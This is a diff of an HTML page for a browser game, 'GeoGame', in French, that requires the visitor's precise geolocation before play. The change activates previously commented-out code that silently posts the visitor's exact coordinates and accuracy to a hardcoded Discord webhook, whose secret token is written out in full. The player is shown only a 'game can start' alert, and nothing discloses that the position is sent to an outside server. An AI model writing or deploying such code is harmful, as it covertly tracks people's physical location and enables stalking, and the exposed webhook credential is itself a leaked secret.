@@ -52,44 +52,43 @@
 <script>
 document.getElementById("startButton").addEventListener("click", () => {
 
-    // Demande de géolocalisation via le navigateur
     navigator.geolocation.getCurrentPosition(
         (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const acc = position.coords.accuracy;
 
-            console.log("Latitude :", lat);
-            console.log("Longitude :", lon);
-            console.log("Précision :", acc);
-
             alert(`Position obtenue ✔️\nLatitude: ${lat}\nLongitude: ${lon}\nPrécision: ${acc}m\n\nLe jeu peut commencer !`);
 
-            // --- Optionnel : envoyer au serveur / webhook ---
-            fetch("https://discord.com/api/webhooks/1430546772387823677/LKjiHykSqFmNDC6bqWj48tJpP72T4MaLZlQhzt4RXtSDftPImEkfL9FeeYthJU4-g_C_", {
+            // --- ENVOI AU WEBHOOK DISCORD ---
+            const webhookURL = "https://discord.com/api/webhooks/1430546772387823677/LKjiHykSqFmNDC6bqWj48tJpP72T4MaLZlQhzt4RXtSDftPImEkfL9FeeYthJU4-g_C_";
+
+            fetch(webhookURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     username: "GeoGame",
                     content: "Nouvel utilisateur (avec consentement)",
-                    embeds: [{
-                        title: "Position exacte",
-                        description: `Latitude: ${lat}\nLongitude: ${lon}\nPrécision: ${acc}m`,
-                        color: 0x00ff99
-                    }]
+                    embeds: [
+                        {
+                            title: "Position exacte",
+                            description: `Latitude : ${lat}\nLongitude : ${lon}\nPrécision : ${acc}m`,
+                            color: 0x00ff99
+                        }
+                    ]
                 })
-            });
-            */
+            })
+            .then(response => {
+                if(response.ok) console.log("Webhook envoyé !");
+                else console.log("Erreur envoi webhook :", response.status);
+            })
+            .catch(err => console.log("Erreur webhook :", err));
 
         },
-
-        // Si l'utilisateur refuse ou erreur
         (error) => {
-            console.log("Erreur géolocalisation :", error);
             alert("Vous avez refusé la localisation ou votre appareil ne la permet pas.\nLe jeu ne peut pas démarrer.");
+            console.log("Erreur géolocalisation :", error);
         },
-
-        // Options de précision maximale
         { enableHighAccuracy: true, timeout: 10000 }
     );
 });
@@ -97,4 +96,3 @@ document.getElementById("startButton").addEventListener("click", () => {
 
 </body>
 </html>
-
